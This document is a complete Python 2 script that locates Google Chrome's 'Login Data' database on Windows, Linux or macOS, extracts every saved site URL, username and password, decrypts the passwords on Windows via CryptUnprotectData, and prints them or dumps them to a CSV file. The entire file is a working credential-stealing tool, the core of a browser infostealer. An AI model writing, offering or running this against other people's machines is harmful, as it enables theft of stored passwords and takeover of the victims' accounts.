import os,sys
import sqlite3
try:
    import win32crypt
except:
    pass
import argparse


def args_parser():
    parser = argparse.ArgumentParser(description="Retrieve Google Chrome Passwords")
    parser.add_argument("--output", help="Output to csv file", action="store_true")
    args = parser.parse_args()
    if args.output:
        csv(main())
    else:
        for data in main():
            print(data)


def main():
    info_list = []
    path = getpath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        cursor = connection.cursor()
        v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        if (os.name == "posix") and (sys.platform == "darwin"):
                print("Mac OSX not supported.")
                sys.exit(0)

        value = v.fetchall()
        for information in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
                if password:
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': str(password)
                    })

            

            elif os.name == 'posix':
                info_list.append({
                    'origin_url': information[0],
                    'username': information[1],
                    'password': information[2]
                    })
        
        
        
        
    except sqlite3.OperationalError, e:
            e = str(e)
            if (e == 'database is locked'):
                print '[!] Make sure Google Chrome is not running in the background'
                sys.exit(0)
            elif (e == 'no such table: logins'):
                print '[!] Something wrong with the database name'
                sys.exit(0)
            elif (e == 'unable to open database file'):
                print '[!] Something wrong with the database path'
                sys.exit(0)
            else:
                print e
                sys.exit(0)
    
 

    return info_list

def getpath():
    if os.name == "nt":
            # This is the Windows Path
            PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
            if (os.path.isdir(PathName) == False):
                print '[!] Chrome Doesn\'t exists'
                sys.exit(0)
    elif ((os.name == "posix") and (sys.platform == "darwin")):
            # This is the OS X Path
            PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
            if (os.path.isdir(PathName) == False):
                print '[!] Chrome Doesn\'t exists'
                sys.exit(0)
    elif (os.name == "posix"):
            # This is the Linux Path
            PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
            if (os.path.isdir(PathName) == False):
                print '[!] Chrome Doesn\'t exists'
                sys.exit(0)
    
    return PathName            

def csv(info):
    with open('chromepass.csv', 'wb') as csv_file:
        csv_file.write('origin_url,username,password \n'.encode('utf-8'))
        for data in info:
            csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data['username'], data['password'])).encode('utf-8'))
    print("Data written to chromepass.csv")


if __name__ == '__main__':
    args_parser()
